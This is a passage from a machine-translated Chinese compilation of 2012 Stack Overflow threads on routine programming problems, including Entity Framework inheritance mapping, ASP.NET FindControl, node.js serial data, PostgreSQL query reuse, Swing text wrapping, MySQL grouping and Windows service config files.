        Property(a => a.ConfirmationID).HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);
        Property(a => a.PageRequestID).IsRequired();
        Property(a => a.ConfirmationNum).IsRequired().HasMaxLength(12);
        Property(a => a.WebActionID).IsRequired();
    }
} 
```

然后，我基于此层次结构创建一个相当大的 LINQ 查询。我会省略那个查询，因为它由大约 10 个步骤组成，我认为这不是我的问题的根源。问题是，当我运行查询时，由于某种原因生成的 SQL 认为列 AuditEventID（基类的主键）存在于 ConfirmationLogs 表（孙表）上。ConfirmationLogs 表具有其父表 (PageRequests) 的外键，然后该表具有其父表 (AuditEvents) 的外键。

我的问题是，我把这个层次结构设置错了吗？“孙子”表是否需要它的父母和祖父母的外键才能起作用？（如果确实如此，我觉得很不幸）。

我很肯定继承关系正在把事情搞砸，因为如果我不让 ConfirmationLogs 成为 PageRequests 的子节点并使用 HasRequired()/WithMany() 配置与 PageRequests 的关系，那么一切正常。

任何帮助，将不胜感激。

**更新**

因此，经过进一步调查，我认为我尝试使用继承的方式存在普遍问题。我应该注意，我正在尝试首先将代码映射到现有数据库。在数据库中，我有我的 AuditEvent 表和一堆“子”表，如 PageRequest。页面请求有它自己的称为 PageRequestID 的主键，以及一个称为 AuditEventID 的外键。其他子表的设置方式相同。在我的 PageRequest 配置类（上面列出）中，我试图通过使用 HasKey 函数来映射它，说 PageRequestID 是主键，并假设 EF 将通过约定和继承知道外键 AuditEventID。我还应该注意，我可以很好地使用模型写入数据库。如果我想写一个 PageRequest，我创建 PageRequest 对象，填充 PageRequest 和 AuditEvent 基类定义的所有必需字段，并通过上下文保存。EF 创建 AuditEvent 记录，并将 pageRequest 记录与 FK 返回到 AuditEvent。

让我觉得我没有使用继承权的原因是我允许 EF 使用我创建的模型和映射为我创建数据库。对于 PageRequest 表（以及所有其他子表），EF 实际上创建了一个名为 AuditEventID 的主键（即使我的配置告诉它不这样做）。该键也被标记为外键，而我想创建为主键的列（本示例中为 PageRequestID）只是配置为必需的（不可为空）。因此，似乎 EF 从我的 BASE 类中获取主键并将其用作我的子类中的主键和外键，几乎就像 AuditEventID 的概念在父表和子表之间传播一样。有没有办法改变这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:06:31.903

您是说这不起作用，并且它仍然期望具有 ConfirmationLog 对象的表中有一个 AuditRequestID？我正在查看参考资料：Specifying Not to Map a CLR Property to a Column in the Database in [http://msdn.microsoft.com/en-us/data/jj591617#1.6](http://msdn.microsoft.com/en-us/data/jj591617#1.6)

```
public ConfirmationLogConfiguration()
{
    //Map to Table
    ToTable("ConfirmationLogs");

    //Primary Key
    HasKey(a => a.ConfirmationID);

    //required fields
    Property(a => a.ConfirmationID).HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);
    Property(a => a.PageRequestID).IsRequired();
    Property(a => a.ConfirmationNum).IsRequired().HasMaxLength(12);
    Property(a => a.WebActionID).IsRequired();

    Ignore(a => a.AuditEventID);
} 
```

祝你好运。

# c# - HtmlGenericControl 给我一个错误“对象引用未设置为对象的实例”

> ID：14074529
> 
> 赞同：1
> 
> 时间：2012-12-28T19:14:09.540
> 
> 标签：c#, asp.net, htmlgenericcontrol

我正在尝试更改从母版页继承其 css 的内容页面的 css。我尝试了以下方法，但由于某种原因，我收到“对象引用未设置为对象的实例”错误。

下面是我的cs代码：

```
 protected void Page_Load(object sender, EventArgs e)
 {
    HtmlGenericControl mycontrol = (HtmlGenericControl)this.Page.Master.FindControl("ul1").FindControl("li1") as HtmlGenericControl;

      mycontrol.Attributes.Add("class", "newCSS");    
 } 
```

在此处查找母版页内容：

```
 <div id="menu">
        <ul id="ul1" runat="server">
            <li id="li1" runat="server">
                <asp:HyperLink ID="HyperLink1" runat="server" NavigateUrl ="home.aspx">Home</asp:HyperLink></li>
            <li id="li2" runat="server">
                <asp:HyperLink ID="HyperLink2" runat="server" NavigateUrl ="AboutUs.aspx">About Us</asp:HyperLink></li>
            <li id="li3" runat="server">
                <asp:HyperLink ID="HyperLink3" runat="server" NavigateUrl="~/courses.aspx" >Courses</asp:HyperLink></li>
            <li id="li4" runat="server">
                <asp:HyperLink ID="HyperLink4" runat="server" NavigateUrl="~/News.aspx" >News</asp:HyperLink></li>
            <li id="li5" runat="server">
                <asp:HyperLink ID="HyperLink5" runat="server" NavigateUrl="ContactInfo.aspx" >Contact Us</asp:HyperLink></li>
        </ul>
    </div> 
```

CSS如下：

```
 #menu a:hover
{
    background-color: white;
    color: #bee2f1;
}

 .newCSS
{
    background-color: black;
    color: #fff;

} 
```

我尝试将 .FindControl ID 作为 HyperLink ID 而不是 ul, li Id，如上所示，但这也不起作用。

编辑：在cs页面中尝试了以下内容：

```
protected void Page_Load(object sender, EventArgs e)
{
        HtmlGenericControl mycontrol = (HtmlGenericControl)Master.FindControl("ul1").FindControl("li1"); 
        mycontrol.Attributes.Add("class", "newCSS");    
} 
```

没有编译器错误，但代码不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:03:47.347

我在这种情况下使用了一个递归函数。当您需要从内容页面查找/编辑母版页上的内容时，这总是很棘手。这个功能对我帮助很大。在示例中，我使用它在我的母版页上找到我的菜单的返回按钮，`Menu2`通过将按钮的 ID 传递给它来调用它。

****方法***

```
public static Control FindControlRecursive(Control root, string id)
    {
        if (id == string.Empty)
            return null;

        if (root.ID == id)
            return root;

        foreach (Control c in root.Controls)
        {
            Control t = FindControlRecursive(c, id);
            if (t != null)
            {
                return t;
            }
        }
        return null;
    } 
```

****用法***

```
Menu menu2 = (Menu)FindControlRecursive(Master.Page, "ReturnButton"); 
```

使用此方法，我现在可以从内容页面访问我的母版页的菜单。

我希望这有帮助！

# javascript - 将值记录到放置在 HTML 中的控制台中

> ID：14074532
> 
> 赞同：0
> 
> 时间：2012-12-28T19:14:45.457
> 
> 标签：javascript, node.js, dom, serial-port, socket.io

我正在使用 node.js 创建一个引入串行数据的服务器。串行数据成功显示在 HTML 中；但是，我想创建一个可以保存数据的“var”。请问有人可以帮忙吗？

这是我的 index.html 页面：

```
<!DOCTYPE html>
<html>
    <head>
    <script src="/socket.io/socket.io.js"></script>

    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>

    <script>

        // open a connection to the serial server:
        var socket = io.connect('http://localhost:8080');

         // when you get a serialdata event, do this:
        socket.on('serialEvent', function (data) {
            // look for the textDisplay element in the HTML below:
            var element = document.getElementById('IDTag');
            // set the stuff inside the element's HTML tags to
            // whatever the 'value' property of the received data is:
            element.innerHTML = data.value;

            });

  </script>
    </head>
    <body>
    And the latest is:
    <div id="IDTag">The RFID Tag ID will show here.</div>   
    </body>
</html> 
```

这是我的 SerialServer.js 文档：

```
/*
    serialServer.js
    a node.js app to read serial strings and send them to webSocket clients
    requires:
        * node.js (http://nodejs.org/)
        * express.js (http://expressjs.com/)
        * socket.io (http://socket.io/#how-to-use)
        * serialport.js (https://github.com/voodootikigod/node-serialport)

    based on the core examples for socket.io and serialport.js

    created 21 Aug 2012
    modified 14 Oct 2012
    by Tom Igoe

    Patches and improvements suggested by Steve Klise, Lia Martinez, and Will Jennings

*/

var serialport = require("serialport"),             // include the serialport library
    SerialPort  = serialport.SerialPort,            // make a local instance of serial
    app = require('express')(),                     // start Express framework
    server = require('http').createServer(app),     // start an HTTP server
    io = require('socket.io').listen(server);       // filter the server using socket.io

var serialData = {};                                // object to hold what goes out to the client

server.listen(8080);                                // listen for incoming requests on the server

console.log("Listening for new clients on port 8080");

// open the serial port. Change the name to the name of your port, just like in Processing and Arduino:
var myPort = new SerialPort("/dev/tty.usbmodemfa131", { 
    // look for return and newline at the end of each data packet:
    parser: serialport.parsers.readline("\r\n") 
});

// respond to web GET requests with the index.html page:
app.get('/', function (request, response) {
  response.sendfile(__dirname + '/index.html');
});

// listen for new socket.io connections:
io.sockets.on('connection', function (socket) {
    // if there's a socket client, listen for new serial data:  
    myPort.on('data', function (data) {
        // set the value property of scores to the serial string:
        serialData.value = data;
        // for debugging, you should see this in Terminal:
        console.log(data);
        // send a serial event to the web client with the data:
        socket.emit('serialEvent', serialData);
    });
}); 
```

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:26:31.647

首先，我建议将所有 javascript 移动到页面末尾，在结束 body 标记（而不是 head 标记）之前。

其次，我觉得奇怪的是你在同一个端口上运行了一个 socket.io 服务器和一个 http 服务器。

我什至不确定这是运行 socket.io 的正确方法，我建议改用官方演示（它们保证可以工作）。

# javascript - Backbone Marionette 中的事件 EventAggregator 和 EventBinder 有什么区别？

> ID：14074540
> 
> 赞同：4
> 
> 时间：2012-12-28T19:15:42.323
> 
> 标签：javascript, backbone.js, marionette, backbone-events

从[Marionette.EventAggregator](https://github.com/marionettejs/backbone.marionette/blob/master/docs/marionette.eventaggregator.md)和[Marionette.EventBinder](https://github.com/marionettejs/backbone.marionette/blob/master/docs/marionette.eventbinder.md)的文档中，代码完全相同。我想我错过了一个差异，它是什么？何时使用它们中的每一个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T20:44:16.367

主要区别在于意图。这些文章中解释了 EventAggregator 的意图：

[http://martinfowler.com/eaaDev/EventAggregator.html](http://martinfowler.com/eaaDev/EventAggregator.html)

[http://codebetter.com/jeremymiller/2009/07/22/braindump-on-the-event-aggregator-pattern/](http://codebetter.com/jeremymiller/2009/07/22/braindump-on-the-event-aggregator-pattern/)

[http://lostechies.com/derickbailey/2011/07/19/references-routing-and-the-event-aggregator-coordinating-views-in-backbone-js/](http://lostechies.com/derickbailey/2011/07/19/references-routing-and-the-event-aggregator-coordinating-views-in-backbone-js/)

EventBinder 的目的是管理事件绑定中的依赖关系，正如 Johnny Oshika 在这里首次描述的那样：[Backbone.js：重新填充或重新创建视图？](https://stackoverflow.com/questions/7567404/backbone-js-repopulate-or-recreate-the-view/7607853#7607853)

...

不过，随着 Marionette 和 Backbone v0.9.9 的发展，EventBinder 现在已经过时了，因为 Backbone.Events 现在包含`listenTo`和`stopListening`方法。`EventAggregator`正在接管 Backbone.Events 未涵盖的任何内容。不过，这适用于 Marionette v1.0-rc3 及更高版本。如果您仍在使用 Marionette v1.0-rc2 或更早版本，您仍然需要 EventBinder。

# sql - 如何重用 SELECT、WHERE 和 ORDER BY 子句的结果？

> ID：14074546
> 
> 赞同：6
> 
> 时间：2012-12-28T19:16:21.203
> 
> 标签：sql, postgresql, select, sql-order-by, where

以下查询返回我们附近的场地（纬度：62.0，经度：25.0），我们落在其半径内，按距离排序：

```
SELECT *, 
     earth_distance(ll_to_earth(62.0, 25.0), 
     ll_to_earth(lat, lon)) AS distance 
FROM venues 
WHERE earth_distance(ll_to_earth(62.0, 25.0), ll_to_earth(lat, lon)) <= radius 
ORDER BY earth_distance(ll_to_earth(62.0, 25.0), ll_to_earth(lat, lon)) 
```

是否可以（并且建议）重新使用结果，`earth_distance(ll_to_earth(62.0, 25.0), ll_to_earth(lat, lon))`而不是为 SELECT、WHERE 和 ORDER BY 子句单独计算结果？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T21:23:36.907

在`GROUP BY`and子句中，您可以引用列别名（输出列）甚至是列表项`ORDER BY`的序号。`SELECT`我引用[手册`ORDER BY`](http://www.postgresql.org/docs/current/interactive/sql-select.html#SQL-ORDERBY)：

> 每个表达式可以是**输出列（SELECT 列表项）的名称或序号**，也可以是由输入列值形成的任意表达式。

大胆强调我的。

但是在`WHERE`and`HAVING`子句中，您只能引用基表中的列（输入列），因此您必须拼出您的函数调用。

```
SELECT *, earth_distance(ll_to_earth(62.0, 25.0), ll_to_earth(lat, lon)) AS dist
FROM   venues 
WHERE  earth_distance(ll_to_earth(62.0, 25.0), ll_to_earth(lat, lon)) <= radius 
ORDER  BY distance; 
```

如果您想知道将计算打包到[CTE](http://www.postgresql.org/docs/current/interactive/queries-with.html)或子查询中是否更快，只需使用`EXPLAIN ANALYZE`. （我对此表示怀疑。）

```
SELECT *
FROM  (
   SELECT *
         ,earth_distance(ll_to_earth(62.0, 25.0), ll_to_earth(lat, lon)) AS dist
   FROM   venues
   ) x
WHERE  distance <= radius 
ORDER  BY distance; 
```

就像[@Mike 评论](https://stackoverflow.com/questions/14074546/how-to-re-use-result-for-select-where-and-order-by-clauses/14075977#comment19458241_14074546)的那样，通过声明一个函数`STABLE`（或`IMMUTABLE`），您可以通知查询计划器，函数调用的结果可以在单个语句中多次重复用于相同的调用。我在这里引用[手册](http://www.postgresql.org/docs/current/interactive/xfunc-volatility.html)：

> STABLE 函数不能修改数据库，并保证在给定单个语句中所有行的相同参数的情况下返回相同的结果。此类别**允许优化器将函数的多次调用优化为单个调用**。

大胆强调我的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T19:23:49.877

虽然我主要使用 MS SQL Server，但我很确定 PostgreSQL 支持 CTE。尝试类似：

```
WITH CTE_venues AS (
SELECT *, earth_distance(ll_to_earth(62.0, 25.0), ll_to_earth(lat, lon)) AS distance 
FROM venues 
)
SELECT *
FROM CTE_venues 
WHERE distance <= radius 
ORDER BY distance 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T20:51:06.933

您还可以创建独立或打包函数并在查询中使用它：

```
 SELECT *
   FROM ...
  WHERE distance <= your_function()  -- OR your_package_name.your_function()
 ORDER BY ... 
```

您可以在选择中使用您的功能：

```
Select your_function() 
  From your_table...
 Where  ... 
```

# java - 文本超出 JTextArea

> ID：14074549
> 
> 赞同：1
> 
> 时间：2012-12-28T19:16:34.147
> 
> 标签：java, swing, jscrollpane, jtextarea, word-wrap

我正在尝试用 Java 做一些事情，这需要我在 ScrollPane 中有一个 JTextArea。

这是我定义它们的方式：

```
private JTextArea longestparagraph = new JTextArea();

....
JScrollPane scrollpanedreapta = new JScrollPane(longestparagraph, 
                        JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, 
                        JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
scrollpanedreapta.setBorder(BorderFactory.createTitledBorder("Cel mai lung paragraf:")); 
```

我遇到的问题是，当文本到达 TextArea 的右边界时，它不会从新行开始，但它会继续。有任何想法如何解决这个问题吗？这是一张图片，让我的陈述更清楚一点。

![在此处输入图像描述](../Images/3616d6aebe4d1814efd1532eef577228.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-28T19:19:47.340

找到了答案。只好这样做：

```
longestparagraph.setLineWrap(true);
longestparagraph.setWrapStyleWord(true); 
```

# php - 需要通过唯一的用户ID，最大轮数从mysql中提取数据，然后按另一个值排序

> ID：14074552
> 
> 赞同：3
> 
> 时间：2012-12-28T19:17:30.680
> 
> 标签：php, mysql, select, group-by

几个月前，我问了一个与此类似的问题，得到了一些帮助，并认为我有答案。3 个月后，我看到这并没有 100% 起作用，所以我需要更多帮助，但现在我了解更多，我可以更好地提出这个问题。

我有一个mysql表`id, userid, rounds, reps, exerciseid`

我需要针对我要进行的练习拉出用户最高的一轮。因此，如果`exerciseid`是 8，我将需要用户获得最高级别，`exerciseid`但如果用户`rounds`不止一次拥有相同的用户，这种情况经常发生，那么我需要按 排序，以`reps`获得真正的最高性能。现在，在获得这些结果之后，我需要对这个数据集进行排序`rounds`，`reps`因此如果多个唯一用户具有相同`rounds`的排序，则按 排序`reps`。

这可以用纯 mysql 完成，还是我最好用 PHP 提取数据并排序所有内容？

```
SELECT
  max(l.rounds) as rounds,
  l.reps,l.userid
from leaderboard l
where l.exerciseid = 8 
group by l.userid 
order by 
  rounds desc,
  reps desc 
```

结构示例 首先这是一个样本集

```
userid  exerciseid  rounds  reps
--     --     --
1    8  23  10
1    8  23  15
1    8  20  10
2    8  28  19
2    8  15  12
3    8  40  29

results I want

userid  exerciseid  rounds  reps
--     --     --
3    8  40  29
2    8  28  19
1    8  23  15 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:51:21.450

如果我正确理解这一点，您希望首先按用户 ID 和轮次分组以获取轮次的 maxreps。然后你想从中选择最大轮数。

这是在 MySQL 中表达这一点的一种方法：

```
select userid, rounds, maxreps
from (SELECT userid, l.rounds, MAX(l.reps) as maxreps
      from leaderboard l
      where l.exerciseid = 8 
      group by l.userid, l.rounds
     ) ur
where exists (select 1 from leaderboard lb where ur.userid = lb.userid and lb.exerciseid = 8 group by lb.userid having max(rounds) = ur.rounds))
order by rounds desc, maxreps desc 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:02:57.183

怎么样：

```
SELECT
  max(l.rounds) as rounds,
  max(l.reps) as reps,l.userid
from leaderboard l
where l.exerciseid = 8 
group by l.userid, l.exerciseid 
order by 
  rounds desc,
  reps desc 
```

# ruby - 尽管我安装了 ruby ，但找不到 jiveapp gem

> ID：14074554
> 
> 赞同：0
> 
> 时间：2012-12-28T19:17:38.317
> 
> 标签：ruby, rubygems, gem

我搜索了类似的问题，但仍然无法解决这个问题。我安装了我的 jiveapps gem，但是找不到它。

```
Successfully installed jiveapps-1.0.7
1 gem installed
Installing ri documentation for jiveapps-1.0.7...
Installing RDoc documentation for jiveapps-1.0.7...
new-host-2:sites jeffreyerickatz$ gem list jiveapps

*** LOCAL GEMS *** 
```

以下也不起作用：

```
new-host-2:sites jeffreyerickatz$ gem which jiveapps
ERROR:  Can't find ruby library file or shared library jiveapps
new-host-2:sites jeffreyerickatz$ rake gemspec
rake aborted!
No Rakefile found (looking for: rakefile, Rakefile, rakefile.rb, Rakefile.rb)

(See full trace by running task with --trace) 
```

你可以看到我只安装了一个版本的 ruby

```
ew-host-2:sites jeffreyerickatz$ rvm list

rvm rubies

=* ruby-1.9.3-p194 [ x86_64 ]

# => - current
# =* - current && default
#  * - default 
```

这是我的宝石路径

```
 - GEM PATHS:
 - /Users/jeffreyerickatz/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/gems/1.9.1
 - /Users/jeffreyerickatz/.gem/ruby/1.9.1 
```

当我做 sudo gem environment 我得到

```
sudo gem environment
RubyGems Environment:
 - RUBYGEMS VERSION: 1.8.24
 - RUBY VERSION: 1.9.3 (2012-04-20 patchlevel 194) [x86_64-darwin11.4.2]
 - INSTALLATION DIRECTORY: /Users/jeffreyerickatz/.rvm/rubies/ruby-1.9.3-  p194/lib/ruby/gems/1.9.1
 - RUBY EXECUTABLE: /Users/jeffreyerickatz/.rvm/rubies/ruby-1.9.3-p194/bin/ruby
 - EXECUTABLE DIRECTORY: /Users/jeffreyerickatz/.rvm/rubies/ruby-1.9.3-p194/bin
 - RUBYGEMS PLATFORMS:
    - ruby
    - x86_64-darwin-11
 - GEM PATHS:
     - /Users/jeffreyerickatz/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/gems/1.9.1
     - /Users/jeffreyerickatz/.gem/ruby/1.9.1
  - GEM CONFIGURATION:
 - :update_sources => true
 - :verbose => true
 - :benchmark => false
 - :backtrace => false
 - :bulk_threshold => 1000
- REMOTE SOURCES:
   - http://rubygems.org/ 
```

宝石路径

```
new-host-2:Desktop jeffreyerickatz$ echo $GEM_HOME
/Users/jeffreyerickatz/.rvm/gems/ruby-1.9.3-p194 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T22:59:23.447

如果您正确复制粘贴，则似乎 gem 正在安装到“/Users/jeffreyerickatz/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/gems/1.9.1”中（注意 1.9 之间的空格.3- 和 p194)。

您可以通过 进一步检查`echo $GEM_HOME`。$GEM_HOME 应该设置为您的 gem 路径。

# html - 具有最大宽度的 div 的跨浏览器固定纵横比

> ID：14074562
> 
> 赞同：0
> 
> 时间：2012-12-28T19:18:23.173
> 
> 标签：html, css, cross-browser, responsive-design

我的目标是在具有固定纵横比的 div 中显示图像（或其他内容），它具有最大宽度，但如有必要会缩小。

以下 jsFiddle 显示了我到目前为止所得到的。它确实适用于 IE8。在 Firefox 和 Chrome 中，内部 div 没有完全填满外部 div，底部有一个小间隙。Safari 显示错误的纵横比。

[http://jsfiddle.net/ywyQQ/2/](http://jsfiddle.net/ywyQQ/2/)

```
 <!doctype html>
<html>
<head>
<title>Fixed Aspect Ratio</title>
<style>
.keepaspect
{
    position: relative;
    max-width: 750px;
    margin: auto;

    /* Box Shadow */
    -moz-box-shadow: 0px 0px 10px #000;
    -webkit-box-shadow: 0px 0px 10px #000;
    box-shadow: 0px 0px 10px #000;
    /* For IE 8 */
    /* For IE 5.5 - 7 */
    behavior: url(http://localhost/PIE.php);
}
.inner
{
    width: 100%;
    padding: auto;
    display: block;
}

</style>
</head>
<body>
      <div class="keepaspect inner">
           <img src=http://i42.tinypic.com/21e18cx.jpg width='100%' height='100%'>
      </div>

</body>
</html> 
```

我该如何设置它，所以它是跨浏览器友好的，并且在某种程度上，它总是填充外部 div？

它还应该与嵌入的 jwplayer 一起使用，正如您在这个示例中看到的那样，它还没有工作。但是 jwplayer 嵌入的标记用于测试/演示目的：http: [//jsfiddle.net/Kn2Ju/1/](http://jsfiddle.net/Kn2Ju/1/)

我不确定这是否需要两种不同的设置。

这是一个完整的示例，但它基于我无法使用的 img 标签。内容不一定是img。 [http://jsfiddle.net/gMUkE/2/](http://jsfiddle.net/gMUkE/2/)

```
 <!doctype html>
<html>
<head>
<title>Fixed Aspect Ratio</title>
<style>
#container
{
    position: relative;
    min-width: 300px;
    max-width: 750px;
    margin: auto;
}
#container img
{
    width: 100%;
    margin: auto;
    position: relative;
    display: block;

            /* Box Shadow */
    -moz-box-shadow: 0px 0px 10px #000;
    -webkit-box-shadow: 0px 0px 10px #000;
    box-shadow: 0px 0px 10px #000;
    /* For IE 8 */
    /* For IE 5.5 - 7 */
    behavior: url(http://localhost/PIE.htc);
}
.content
{
    width: 100%;
    height: 100%; /*optional in case the poster image has exact aspect ratio*/
    position: absolute;
    z-index: 1;
}
</style>
</head>
<body>
      <div id=container>
          <img src=http://i42.tinypic.com/21e18cx.jpg>
      </div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T23:37:32.237

在 img 标签中添加：

```
vertical-align: top; 
```

[http://jsfiddle.net/Riskbreaker/ywyQQ/5/](http://jsfiddle.net/Riskbreaker/ywyQQ/5/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-03T01:55:56.960

对于图像，以下 jsFiddle 是一个可行的解决方案（如 @Jared Farrish 和 @biziclop 所建议的那样）：http: [//jsfiddle.net/vEMEw/](http://jsfiddle.net/vEMEw/)

图像的另一种解决方案是我在问题中已经提到的解决方案：http: [//jsfiddle.net/gMUkE/2/](http://jsfiddle.net/gMUkE/2/)

到目前为止，我发现的唯一解决方案（也）适用于嵌入式 jwplayer 并且具有响应性，它是使用 iframe。我不知道这个解决方案到底有多少“跨浏览器”。我用所有这些浏览器成功地测试了它：FF 17.0.1、IE 8.0、Safari 5.0.3、Chrome 23.0.1271.97。

**CrossBrowserJWPlayerResponsive.html**

```
 <!doctype html>
<html>
<head>
<script src="/media/jwadvanced/player/6/jwplayer.js" type="text/javascript"></script>
<script src="/media/k2/assets/js/jquery-1.8.2.min.js" type="text/javascript"></script>
<script src="/media/k2/assets/js/k2.noconflict.js" type="text/javascript"></script>
<title>Fixed Aspect Ratio</title>
<style>

#videowrap {
    width: 700px;
    max-width: 70%;
    background: #fff;
    padding: 30px;
    margin: 0 auto;
}

.video-container {
    position: relative;
    padding-bottom: 56.25%;
    padding-top: 30px;
    height: 0;
    overflow: hidden;
}
.video-container iframe,
.video-container object,
.video-container embed {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}

</style>
</head>
<body>
<div id="videowrap">
    <div class="video-container">
        <div id="uniquePlayerID">
                <iframe src="iframetmpl.htm" width="800" height="450" frameborder="0" scrolling="no"></iframe>
          </div>
    </div>
</div>

</body>
</html> 
```

**iframetmpl.htm**

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <title>100% Height / Width</title>
     <script src="/media/jwadvanced/player/6/jwplayer.js" type="text/javascript"></script>
        <script>jwplayer.key="YOURJWPLAYERKEY"</script>
        <style type="text/css">
        html,body { height:100%; width:100%; padding:0; margin:0; }
        #player {
            height:100%;
            width:100%; padding:0; margin:-3px;
            }
        </style>
    </head>
    <body>
    <div id="player">
    </div>
        <script type="text/javascript">
                jwplayer('player').setup({
            'file': '/path/to/movie.mp4',
            'hd.file': '/path/to/hd/movie.mp4',
            'image': '/path/to/movieImage.jpg',
            'autostart': 'false',
            'width': '100%',
            'height': '100%',
            'wmode': 'opaque',
            'controlbar': 'bottom',
            'listbar': {
                'size': '180'
            },
            'logo': {
                'timeout': '1.5',
                'file': 'images/logo.png'
            }
        });
        </script>
    </body>
</html> 
```

# c# - Windows 服务 app.config 位置

> ID：14074563
> 
> 赞同：43
> 
> 时间：2012-12-28T19:18:23.300
> 
> 标签：c#, windows-server-2008

我在 Windows Server 2008 上安装了 C# Windows 服务。我使用 InstallUtil 安装了它。该服务从 app.config 文件中读取一些数据，并且运行良好。你能告诉我安装服务后这个文件在哪里吗？我一直在寻找几个小时，但找不到它。

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-12-28T19:43:08.250

您可以按照以下步骤验证已安装 Windows 服务的确切位置：

1.  单击“管理工具”图标下的“服务”图标，调出 Windows 服务列表。您也可以通过在开始菜单下的搜索菜单中键入“查看本地服务”来获取此列表。

2.  在已安装服务列表中选择您的 Windows 服务，右键单击，然后选择属性。您还可以双击代表服务的行。

3.  在“属性”对话框中找到“可执行文件路径”值。该值将包括任何命令行参数。

4.  打开服务可执行文件所在的文件夹。

如果 Windows 服务是用 .NET Framework 构建的，它的配置会保存在对应的 .config 文件中，即以“.config”为后缀的可执行文件的名称，例如，如果可执行文件的名称是“XyzService.config”。 exe”，则 .config 文件的名称将为“XyzService.exe.config”。

有几点需要注意：

*   如果您在使用 Visual Studio 在同一台机器上构建服务后安装了该服务，那么 Visual Studio 将转换项目中的 App.config 文件并将其自动放置在构建输出文件夹中（并使用上述命名适当地重命名它惯例）。

*   如果您的机器设置为在 Windows 资源管理器中隐藏文件扩展名，您将看到 2 个文件“XyzService”和“XyzService.exe”。在这种情况下，“XyzService.exe”是您的配置文件。如果您随后在 Windows 资源管理器中关闭隐藏文件扩展名的选项，您将开始看到“XyzService.exe”和“XyzService.exe.config”。

*   如果您找不到相应的 .exe.config 文件，则服务中的代码可能会回退到默认值。在这种情况下，您可以在服务可执行文件旁边放置一个正确命名和格式化的配置文件，然后重新启动服务，一切都会好起来的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-28T19:40:55.210

根据[微软](http://msdn.microsoft.com/en-us/library/8f6988ab%28v=vs.80%29.aspx)

> 对于客户端可执行文件，应用程序配置文件与应用程序的可执行文件位于同一目录中，并且与带有 .config 扩展名的可执行文件具有相同的基本名称。

请注意，如果您的 exe 名为 appname.exe，并且您将 Windows 资源管理器设置为隐藏扩展名，那么您的应用程序将显示为 appname，而您的配置文件将显示为 appname.exe（即使真实名称是 appname.exe）。 exe.config)

正如其他人指出的那样，InstallUtil 不对配置文件做任何事情，它应该以与 exe 本身相同的方式复制到服务器。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-28T19:20:42.870

它与您使用[installutil](http://msdn.microsoft.com/en-us/library/50614e95%28v=vs.80%29.aspx)工具注册服务的位置相同。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-28T19:26:43.053

鉴于 App.config 是`{ProjectName}.exe.config`Windows 服务这一事实，它可能会被调用。检查该文件是否存在以及是否是您要查找的文件。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-28T19:20:15.177

您的应用程序（Windows 服务）所在的位置相同。

检查一下，如果它不存在，请将其放在与服务相同的目录中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-28T19:27:11.273

如果您有一个实时环境（从您的问题来看，您似乎确实如此），您可以使用高级 Process Monitor 实用程序检查实际发生的情况。但通常 .config 文件位于 .exe 旁边，并且命名相同。

# javascript - 在按钮单击时返回动态 CheckBoxList 跨度 ID

> ID：14074568
> 
> 赞同：0
> 
> 时间：2012-12-28T19:18:46.937
> 
> 标签：javascript, asp.net

我有一个动态`CheckBoxList`创建一个 HTML 表。为了简单起见，我列出了一行。

```
<table id="checkBoxList1" border="0">
    <tr>
        <td><span someValue="neededValue"><input id="checkBoxList1_0" type="checkbox" name="checkBoxList1$0" checked="checked" /><label for="checkBoxList1_0">TestTopic1</label></span></td>
    </tr>
</table> 
```

我还有一个 ASP 按钮，单击时将运行 javascript。我需要函数来返回`"neededValue"`. 这是 ASP 按钮和 javascript 函数：

```
<asp:Button ID="btnSubscribe" runat="server" Text="Update Subscriptions" OnClientClick="return GetSelectedItem()"/>

<script type="text/javascript">
function GetSelectedItem() {
    var CHK = document.getElementById("<%=checkBoxList1.ClientID%>");
    var checkbox = CHK.getElementsByTagName("input");
    var spans = CHK.getElementsByTagName("span");
    for (var i = 0; i < checkbox.length; i++) {
        if (checkbox[i].checked) {
            alert("Selected = " + spans[i]);
        }
    }
    return false;
}
</script> 
```

现在它返回一个空值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:27:11.097

替换`spans[i]`为`checkbox[i].parentNode.getAttribute('someValue')`。

我推荐使用 jQuery。它大大简化了您的代码，例如：

```
<asp:Button ID="btnSubscribe" runat="server" Text="Update Subscriptions" />

$(function() {
    $('#<%=btnSubscribe.ClientID%>').click(function (e) {
        $('#<%=checkBoxList1.ClientID%> input:checked').each(function() {
            alert('Selected = ' + $(this).closest('span').attr('someValue'));
        });
        e.preventDefault();
    });
}); 
```

# android - Android loop update TextView

